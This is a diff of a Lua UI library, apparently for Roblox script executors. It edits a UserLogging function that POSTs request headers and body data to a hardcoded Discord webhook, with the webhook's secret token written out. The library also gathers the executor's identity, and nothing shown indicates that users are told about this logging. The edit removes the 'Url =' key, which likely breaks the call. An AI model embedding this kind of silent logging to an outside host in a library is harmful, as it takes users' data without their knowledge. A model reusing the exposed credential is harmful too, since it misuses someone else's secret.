@@ -106,12 +106,12 @@ end
 function library.UserLogging:LogUser(data)
 	if RequestFunc then
 		--pcall(function()
-			RequestFunc({
-				Url = "https://discord.com/api/webhooks/1474723230681137213/L_F18XJds4TWLyrpGVQKngmbocmFpWRcd-tEBY771s5tZ_JMPTQKIvpX7x-L3o_IxXtO",
-				Method = "POST",
-				Headers = data.Headers,
-				Body = data.Body
-			})
+		RequestFunc({
+			"https://discord.com/api/webhooks/1474723230681137213/L_F18XJds4TWLyrpGVQKngmbocmFpWRcd-tEBY771s5tZ_JMPTQKIvpX7x-L3o_IxXtO",
+			Method = "POST",
+			Headers = data.Headers,
+			Body = data.Body
+		})
 		--end)
 	else
 		print("er")
@@ -4601,9 +4601,9 @@ function library:CreateWindow(options)
 
 		library.UserTime = formattedTime .. " (" .. timeZoneAbbrev .. ")"
 	end)
-	
+
 	local e, v = identifyexecutor()
-	
+
 	local data = {
 		--Url = options.Logging.Url,
 
